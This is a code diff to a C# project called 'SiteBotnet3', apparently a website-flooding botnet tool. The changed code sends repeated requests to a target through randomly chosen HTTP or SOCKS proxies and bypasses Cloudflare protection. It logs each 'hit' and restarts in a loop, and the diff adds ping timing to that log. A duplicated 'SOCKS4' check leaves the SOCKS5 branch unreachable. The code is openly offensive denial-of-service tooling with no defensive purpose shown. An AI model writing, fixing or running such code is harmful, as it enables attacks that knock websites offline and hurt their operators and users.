@@ -51,19 +51,21 @@ namespace SiteBotnet3
                     req.IgnoreProtocolErrors = true;
                     req.KeepAlive = true;
 
-                    string proxy = ProxyList[Program.Rand.Next(ProxyList.Count)];
                     if (ProxyType == "HTTP")
                     {
+                        string proxy = ProxyList[Program.Rand.Next(ProxyList.Count)];
                         req.Proxy = HttpProxyClient.Parse(proxy);
                         Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
                     }
                     else if (ProxyType == "SOCKS4")
                     {
+                        string proxy = ProxyList[Program.Rand.Next(ProxyList.Count)];
                         req.Proxy = Socks4ProxyClient.Parse(proxy);
                         Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
                     }
                     else if (ProxyType == "SOCKS4")
                     {
+                        string proxy = ProxyList[Program.Rand.Next(ProxyList.Count)];
                         req.Proxy = Socks5ProxyClient.Parse(proxy);
                         Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
                     }
@@ -88,10 +90,11 @@ namespace SiteBotnet3
                         if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri);
                     }
 
-                    new Ping().Send(TargetUri.Host);
+                    Ping p = new Ping();
+                    long time = p.Send(TargetUri.Host).RoundtripTime;
 
                     Hits += 1;
-                    Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Target : " + Target + " | Threads : " + Threads);
+                    Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Ping : " + time + "ms | Target : " + Target + " | Threads : " + Threads);
                     Start(false);
                 }
             }
